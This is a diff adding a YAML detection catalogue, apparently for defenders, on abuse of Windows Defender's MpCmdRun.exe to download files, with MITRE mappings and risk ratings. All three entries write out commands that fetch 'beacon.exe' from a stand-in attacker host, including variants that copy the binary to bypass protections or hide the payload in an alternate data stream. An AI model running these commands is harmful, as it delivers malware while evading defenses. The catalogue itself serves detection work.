@@ -1,0 +1,71 @@
+- command: MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\beacon.exe
+  description: Abuse MpCmdRun to download a remote file and save it to the target path.
+  killchain:
+    - Actions on Objectives
+    - Installation
+  mitre:
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/
+    - https://twitter.com/Oddvarmoe/status/1301444858910052352
+    - https://twitter.com/mohammadaskar2/status/1301263551638761477
+    - https://twitter.com/NotMedic/status/1301506813242867720
+  risk: High
+  risk_reason: MpCmdRun contacting non-standard external URLs is extremely suspicious.
+  fidelity: High
+  fidelity_reason: This is typically an extremely rare behavior in most organizations.
+  tool: mpcmdrun
+  threatactors:
+    N/A:
+      - N/A
+- command: copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url https://attacker.server/beacon.exe -path C:\Users\Public\Downloads\evil.exe
+  description: Abuse MpCmdRun to download a remote file and save it to the target path, bypassing certain Windows 10 protections via the initial copy.
+  killchain:
+    - Actions on Objectives
+    - Installation
+  mitre:
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/
+    - https://twitter.com/Oddvarmoe/status/1301444858910052352
+    - https://twitter.com/mohammadaskar2/status/1301263551638761477
+    - https://twitter.com/NotMedic/status/1301506813242867720
+  risk: High
+  risk_reason: MpCmdRun contacting non-standard external URLs is extremely suspicious.
+  fidelity: High
+  fidelity_reason: This is typically an extremely rare behavior in most organizations.
+  tool: mpcmdrun
+  threatactors:
+    N/A:
+      - N/A
+- command: MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\nicefile.txt:evil.exe
+  description: Abuse MpCmdRun to download a remote file and save it to the Alternate data Stream (ADS) of a local file.
+  killchain:
+    - Actions on Objectives
+    - Installation
+  mitre:
+    Command and Control:
+      - T1105
+    Defense Evasion:
+      - T1564.004
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/
+    - https://twitter.com/Oddvarmoe/status/1301444858910052352
+    - https://twitter.com/mohammadaskar2/status/1301263551638761477
+    - https://twitter.com/NotMedic/status/1301506813242867720
+  risk: High
+  risk_reason: MpCmdRun contacting non-standard external URLs is extremely suspicious, especially when combined with ADS usage.
+  fidelity: High
+  fidelity_reason: This is typically an extremely rare behavior in most organizations.
+  tool: mpcmdrun
+  threatactors:
+    N/A:
+      - N/A
